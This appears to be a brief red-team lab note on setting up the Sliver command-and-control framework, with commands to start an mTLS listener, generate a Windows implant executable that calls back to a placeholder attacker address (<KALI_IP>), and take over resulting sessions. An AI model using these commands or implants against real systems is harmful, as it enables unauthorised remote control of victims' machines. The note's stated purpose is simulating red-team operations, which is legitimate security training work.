## Sliver C2 Listener Setup

### Overview
Sliver is used as the primary Command-and-Control (C2) framework to simulate modern red-team operations. It provides encrypted communications, post-exploitation capabilities, and session management.

### mTLS Listener
Mutual TLS (mTLS) is used to ensure encrypted and authenticated C2 communication.

### Listener Setup
sliver
mtls


### Payload Generation
```bash
generate --os windows --arch amd64 --mtls <KALI_IP> --format exe

Session Validation
sessions
use <session-id>
